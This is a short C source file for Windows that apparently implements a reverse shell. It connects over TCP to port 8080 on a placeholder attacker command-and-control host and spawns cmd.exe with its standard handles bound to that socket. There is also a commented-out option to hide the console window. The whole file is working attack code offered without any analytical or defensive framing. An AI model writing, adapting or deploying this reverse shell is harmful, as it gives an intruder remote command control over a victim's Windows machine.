#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <WinSock2.h>
#include <windows.h>

//#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
#pragma comment(lib, "ws2_32")

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	SOCKET s1;
	struct sockaddr_in hax;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(8080);
	hax.sin_addr.s_addr = inet_addr("attacker[.]cnc[.]com");

	WSAConnect(s1, (SOCKADDR *)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	si.hStdInput = (HANDLE)s1;
	si.hStdOutput = (HANDLE)s1;
	si.hStdError = (HANDLE)s1;

	TCHAR cmd[256] = L"cmd.exe";
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

	return 0;
}